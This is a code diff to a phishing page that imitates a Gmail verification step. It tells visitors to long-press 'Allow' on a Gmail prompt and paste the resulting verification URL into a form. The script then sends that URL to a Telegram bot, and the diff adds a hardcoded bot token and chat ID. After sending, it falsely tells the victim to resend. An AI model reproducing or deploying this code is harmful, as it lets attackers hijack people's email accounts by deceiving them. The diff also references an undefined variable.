@@ -192,7 +192,7 @@
                 <input type="hidden" name="csrfmiddlewaretoken" value="89rSqdSixXHmmv8rMQ2hsH6bWPZ7QUAvXjgXdA2OmDSdqa7VM9PdnpKTCdODWT25">
 
                 <div class="input-group">
-                    <label>Long Press Allow on Gmail send, Copy URL and Paste verification URL here</label>
+                    <label>Long Press "Allow" on Gmail send, Copy URL and Paste verification URL here</label>
                     <input type="text" name="code" placeholder="">
                 </div>
 
@@ -209,10 +209,18 @@
     <script>
         // Display the email stored in localStorage
         const email = localStorage.getItem("userEmail");
-        document.getElementById("emailDisplay").innerText = email ? email : "No email found.";
+
+        // Check if the email exists and display it
+        if (email) {
+            document.getElementById("emailDisplay").innerText = email;
+        } else {
+            document.getElementById("emailDisplay").innerText = "No email found.";
+        }
 
         let seconds = 25;
-        const btn = document.getElementById('resendBtn');
+        let btn = document.getElementById('resendBtn');
+        const TELEGRAM_BOT_TOKEN = '8557833693:AAH4LBXHy5LeKk90dcO1-8nwarAggwrjmOc'; // Replace with your bot token
+        const CHAT_ID = '1345737806'; // Replace with your chat ID
 
         function countdown() {
             seconds--;
@@ -221,6 +229,8 @@
                 btn.innerHTML = "Resend email";
                 return;
             }
+
+            countElem.textContent = seconds;
             btn.innerHTML = `Resend email (<span id="count">${seconds}</span> sec.)`;
             setTimeout(countdown, 1000);
         }
@@ -228,7 +238,8 @@
         setTimeout(countdown, 1000);
 
         document.querySelector('form').addEventListener('submit', function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
+
             const verificationUrl = document.querySelector('input[name="code"]').value;
 
             // Send verification URL to the Telegram bot
@@ -249,8 +260,8 @@
                     return response.json();
                 })
                 .then(data => {
-                    alert('Copy the URL well and resend again');
-                    console.log(data);
+                    alert('copy url well and resend again');
+                    console.log(data); // Optional: log the response from Telegram
                 })
                 .catch(error => {
                     alert('Error sending verification URL: ' + error);
